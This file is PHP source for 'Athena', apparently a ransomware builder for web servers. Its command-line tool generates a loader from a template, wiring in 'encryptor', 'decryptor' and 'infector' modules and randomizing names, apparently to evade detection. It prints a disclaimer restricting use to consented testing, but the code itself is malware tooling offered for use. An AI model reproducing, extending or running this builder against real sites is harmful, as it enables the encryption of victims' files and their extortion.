<?php

define('_ATHENA_VERSION_', '1.0');
define('_INFECTOR_', __DIR__.'/modules/infector.php');

class Athena
{
    protected $argv;
    protected $shortopts;
    protected $longopts;
    protected $options;
    protected $options_list = [
      "--generate" => 'generate loader',
      "--tmodules" => 'Encryptor, Decryptor',
      "--filename" => 'Output filename'
    ];
    protected $config_file = 'config/athena.json';

    public function __construct()
    {
        $this->argv = $_SERVER['argv'];

        if(count($this->argv) < 4)
            $this->welcome();
        else
            $this->run();
    }

    protected function loadConfig($template = false)
    {
        if(!$template)
            return false;

        if(file_exists($template))
        {
            $config = json_decode(file_get_contents($this->config_file), true);
            if($config && $config !== NULL)
            {
                $config = serialize($config);
                $file_name = false;
                while($file_name == false)
                {
                    $name = __DIR__.'/tmp/'.substr(str_shuffle(str_repeat($x='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(3/strlen($x)) )),1,7).'.php';
                    if(!file_exists($name))
                        $file_name = $name;
                }
                $tmp_template = fopen($name,'w');
                fwrite($tmp_template, str_replace('{{ATHENA_CONFIGURATION}}', $config, file_get_contents($template)));
                fclose($tmp_template);
                return $name;
            }
        }
        return false;
    }

    protected function welcome()
    {
        echo "---------------------------------------".PHP_EOL;
        echo "* ATHENA "._ATHENA_VERSION_.PHP_EOL;
        echo "* Twitter : @graniet75".PHP_EOL;
        echo "* Github  : graniet".PHP_EOL;
        echo "---------------------------------------".PHP_EOL;
        foreach ($this->options_list as $key => $option)
            echo "* " . $key . "    :   " . $option.PHP_EOL;
        echo "---------------------------------------".PHP_EOL;
        echo "example: ". $_SERVER['argv'][0] . " --generate --tmodules encryptor".PHP_EOL;
        echo "\033[00;31mThis is only for testing purposes and can only be used where strict consent has been given.".PHP_EOL."Do not use this for illegal purposes, period.\033[0m";
    }

    protected function run()
    {
        $this->shortopts  = "";

        $this->longopts  = array(
            "filename:",
            "tmodules:",
            "generate",
        );

        $this->options = getopt($this->shortopts, $this->longopts);

        if(isset($this->options['generate'], $this->options['tmodules']))
        {
            if($this->options['tmodules'] == "encryptor")
                $this->generate();
            elseif($this->options['tmodules'] == "decryptor")
                $this->generate('decryptor');
        }
    }

    /**
     * @param string $type
     */
    protected function generate($type = 'encryptor')
    {
        if($type == "encryptor")
            $template = $this->loadConfig(__DIR__."/modules/encryptor.php");
        else
            $template = __DIR__."/modules/decryptor.php";

        $loader_template = file_get_contents('template/loader.php');
        if(isset($this->options['filename'])) {
            $file_name = $this->options['filename'];
        }
        else
            $file_name = substr(str_shuffle(str_repeat($x='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(10/strlen($x)) )),1,10);

        $file = fopen($file_name . '.php', 'w');
        $loader_template = str_replace('{{URL_LNK}}', $template, $loader_template);
        $loader_template = str_replace('{{FIRST_V}}', substr(str_shuffle(str_repeat($x='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(3/strlen($x)) )),1,3), $loader_template);
        $loader_template = str_replace('{{SECOND_V}}', substr(str_shuffle(str_repeat($x='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(3/strlen($x)) )),1,3), $loader_template);
        $loader_template = str_replace('{{URL_INJ}}', _INFECTOR_, $loader_template);
        fwrite($file, $loader_template);
        fclose($file);
        echo "success: File writed '". $file_name .".php'";
    }
}

new Athena();